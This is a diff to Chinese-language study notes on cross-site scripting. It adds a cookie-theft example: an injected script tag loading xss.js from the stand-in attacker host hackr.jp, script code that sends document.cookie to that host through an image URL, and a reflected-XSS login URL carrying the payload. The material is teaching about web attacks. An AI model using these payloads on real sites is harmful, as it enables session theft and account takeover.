@@ -92,12 +92,12 @@ a: 在动态生成html处发生，以编辑个人信息为例子：
 
     确认修改
 
+```
 在确认后将编辑的内容正常展示，<b>异常情况下</b>但是当输入的姓名带有html标签或者利用js会造成更严重的后果
 比如将姓名输入为：<s>显示的内容将会带有下划线</s>
 
 这里虽然不会造成太严重的后果，但是利用js可以
 
-```
 
 b: XSS是攻击者利用预先设置的陷阱触发的被动攻击
 
@@ -139,8 +139,22 @@ http://example.js/login?ID="><script>var+f=document.getElementById("login"); +f.
 
 > 对用户cookie的窃取攻击
 
+除了上面的在表单中设下圈套之外，下面的恶意构造的脚本也同样能够以跨站脚本攻击方式，窃取用户的cookie信息
 
+```
+<script src="http://hackr.jp/xss.js"></script>
 
+xss.js如下内容
+var content = encodeURIComponent(document.cookie)
+document.write("<img src=http://hackr.jp/?>");
+document.write(content)
+document.write(">")
+
+```
+在存在漏洞的网站运行后 cookie信息就会发送至攻击者的网站
+```
+http://example.js/login?ID="><script src=http://hackr.jp/xss.js></script>"
+```
 
 
 
